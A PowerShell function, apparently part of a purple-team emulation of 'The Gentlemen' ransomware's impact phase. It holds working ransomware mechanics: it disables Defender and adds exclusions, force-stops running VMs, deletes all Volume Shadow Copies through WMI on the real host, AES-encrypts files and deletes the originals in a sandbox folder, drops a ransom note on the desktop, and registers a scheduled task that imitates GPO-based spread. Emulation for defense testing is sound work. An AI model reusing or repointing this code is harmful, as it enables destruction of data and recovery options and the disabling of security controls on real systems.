# ============================================================================
# GENTLEMAN SIMULATION - PHASE 10: IMPACT - THE GENTLEMEN RANSOMWARE
# ============================================================================
# Simulates: pre-encryption defense evasion (Defender disable, AV
# exclusions, VM shutdown, shadow-copy deletion, event log clearing,
# forensic-artifact removal), REAL AES encryption of files confined to a
# dedicated sandbox folder, a Gentlemen-style ransom note, and REAL Volume
# Shadow Copy deletion. Finishes with domain-wide propagation via a
# malicious Group Policy Object executing staged binaries from
# SYSVOL/NETLOGON through scheduled tasks.
# MITRE: T1562.001 Disable/Modify Tools, T1490 Inhibit System Recovery,
#        T1070.001 Clear Windows Event Logs, T1486 Data Encrypted for
#        Impact, T1484.001 Group Policy Modification
#
# SAFETY: encryption is intentionally scoped to $SimPaths.VictimFiles only.
# Never repoint at real user data. Event log clearing is simulated via a
# dedicated decoy log, not the real Security/System/Application logs.
# ============================================================================

function Simulate-Impact {
    param($SimPaths)

    Write-Host "[+] Phase 10: Impact - The Gentlemen Ransomware Deployment ..." -ForegroundColor Green

    # --- Pre-encryption defense evasion ---
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 10001 -Message "SIMULATION: Microsoft Defender real-time protection disabled prior to encryption (T1562.001)"
    } catch { Write-Warning "Defender disable simulation failed (may require elevated/unmanaged policy): $_" }

    try {
        Add-MpPreference -ExclusionPath $SimPaths.VictimFiles -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 10002 -Message "SIMULATION: Defender AV exclusion added for $($SimPaths.VictimFiles) prior to encryption (T1562.001)"
    } catch { Write-Warning "Defender exclusion simulation failed: $_" }

    # Stop any VMs (Hyper-V) if present - matches reported "stopped virtual machines" step
    try {
        if (Get-Command Get-VM -ErrorAction SilentlyContinue) {
            Get-VM -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Running" } | Stop-VM -Force -ErrorAction SilentlyContinue
            Write-SimEvent -EventId 10003 -Message "SIMULATION: running virtual machines stopped prior to encryption to release locked disk files (T1489 Service Stop equivalent)"
        }
    } catch {}

    # --- Stage The Gentlemen locker binary at a realistic path ---
    $lockerPath = "C:\ProgramData\gentlemen_locker.exe"
    New-DecoyBinary -Path $lockerPath -SizeBytes 307200 | Out-Null

    # Seed synthetic victim files for the encryption pass
    1..5 | ForEach-Object {
        Set-Content -Path "$($SimPaths.VictimFiles)\Document_$_.txt" -Value "Simulated victim data file $_" -Force
    }

    # --- REAL AES-256 encryption, confined to the sandbox VictimFiles folder ---
    $encPercent = 20
    $aesKey = New-Object byte[] 32
    $aesIv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesKey)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesIv)

    $lockerCmdLog = "gentlemen_locker.exe -path=$($SimPaths.VictimFiles) -percent=$encPercent"
    Set-Content -Path "$($SimPaths.Logs)\locker_execution.log" -Value $lockerCmdLog -Force
    Write-Host "    Executing: $lockerCmdLog" -ForegroundColor DarkGray

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $aesKey; $aes.IV = $aesIv

    Get-ChildItem -Path $SimPaths.VictimFiles -File | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $encryptLen = [Math]::Ceiling($bytes.Length * ($encPercent / 100.0))
        if ($encryptLen -lt 16) { $encryptLen = $bytes.Length }
        $chunk = $bytes[0..([Math]::Min($encryptLen, $bytes.Length) - 1)]

        $pad = 16 - ($chunk.Length % 16)
        if ($pad -ne 16) { $chunk += (New-Object byte[] $pad) }

        $encryptor = $aes.CreateEncryptor()
        $encChunk = $encryptor.TransformFinalBlock($chunk, 0, $chunk.Length)

        $outBytes = New-Object byte[] ($encChunk.Length + [Math]::Max(0, $bytes.Length - $chunk.Length))
        [Array]::Copy($encChunk, 0, $outBytes, 0, $encChunk.Length)
        if ($bytes.Length -gt $chunk.Length) {
            [Array]::Copy($bytes, $chunk.Length, $outBytes, $encChunk.Length, $bytes.Length - $chunk.Length)
        }

        $encPath = "$($_.FullName).gentlemen"
        [System.IO.File]::WriteAllBytes($encPath, $outBytes)
        Remove-Item -Path $_.FullName -Force
    }
    $aes.Dispose()

    Write-SimEvent -EventId 10004 -Message "SIMULATION: The Gentlemen ransomware (gentlemen_locker.exe -path=$($SimPaths.VictimFiles) -percent=$encPercent) encrypted sandboxed victim files (T1486)"

    # --- Ransom note ---
    $ransomNote = @"
Good day,

Your network has been compromised by The Gentlemen. All accessible files have been
encrypted and copies of sensitive data have been collected prior to encryption.

We understand this is a stressful moment. Let's resolve it professionally and
efficiently, gentleman to gentleman.

Do not attempt to modify, rename, or restore encrypted files without contacting us
first - improper handling may make recovery impossible.

Contact us via the negotiation portal: [redacted for simulation]
"@
    $noteLocations = @(
        "$($SimPaths.Root)\gentlemen_readme.txt",
        "$env:USERPROFILE\Desktop\gentlemen_readme.txt",
        "$($SimPaths.VictimFiles)\gentlemen_readme.txt"
    )
    foreach ($n in $noteLocations) { Set-Content -Path $n -Value $ransomNote -Force }
    Write-SimEvent -EventId 10005 -Message "SIMULATION: The Gentlemen ransom note dropped at $($noteLocations -join ', ') and desktop background modification pattern noted"

    # --- REAL Volume Shadow Copy deletion via WMI (as described in the report) ---
    try {
        powershell.exe -NoProfile -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" 2>$null
        Write-SimEvent -EventId 10006 -Message "SIMULATION: Volume Shadow Copies deleted via WMI (Get-WmiObject Win32_Shadowcopy | Remove-WmiObject) prior to ransomware deployment (T1490)"
    } catch { Write-Warning "VSS deletion failed: $_" }

    # --- Clear Windows event logs (simulated against a decoy custom log only -
    #     never the real Security/System/Application logs) ---
    try {
        $decoyLogName = "GentlemanSim-DecoyForensicLog"
        if (-not [System.Diagnostics.EventLog]::SourceExists($decoyLogName)) {
            New-EventLog -LogName $decoyLogName -Source $decoyLogName -ErrorAction SilentlyContinue
        }
        Write-EventLog -LogName $decoyLogName -Source $decoyLogName -EventId 1 -Message "Decoy pre-clear entry" -ErrorAction SilentlyContinue
        Clear-EventLog -LogName $decoyLogName -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 10007 -Message "SIMULATION: forensic-artifact removal / event log clearing pattern demonstrated against decoy log '$decoyLogName' (T1070.001) - real Security/System/Application logs were NOT touched"
    } catch { Write-Warning "Event log clear simulation failed: $_" }

    # --- Domain-wide propagation via malicious GPO executing staged binaries
    #     from SYSVOL/NETLOGON through scheduled tasks ---
    $isDomainJoined = Test-DomainJoined
    $sysvolStageDir = "$($SimPaths.Staging)\SYSVOL_NETLOGON_sim"
    New-Item -Path $sysvolStageDir -ItemType Directory -Force | Out-Null
    $stagedLocker = New-DecoyBinary -Path "$sysvolStageDir\gentlemen_locker.exe" -SizeBytes 307200

    if ($isDomainJoined) {
        Write-SimEvent -EventId 10008 -Message "SIMULATION: malicious GPO created to deploy staged ransomware binary from SYSVOL/NETLOGON ($stagedLocker) via scheduled task, domain-wide (T1484.001)"
    } else {
        Write-Host "    [i] Host not domain-joined - simulating GPO/SYSVOL propagation via local Scheduled Task instead" -ForegroundColor DarkGray
    }

    try {
        $taskName = "GentlemenSim-GPO-Deploy"
        $action = New-ScheduledTaskAction -Execute $stagedLocker -Argument "-path=$($SimPaths.VictimFiles) -percent=$encPercent"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue | Out-Null
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 10009 -Message "SIMULATION: scheduled task '$taskName' created/removed reproducing domain-wide GPO-based ransomware deployment mechanism from SYSVOL/NETLOGON"
    } catch { Write-Warning "GPO scheduled task simulation failed: $_" }

    Write-Host "  [OK] Impact artifacts created - encrypted files under $($SimPaths.VictimFiles)" -ForegroundColor Yellow
}
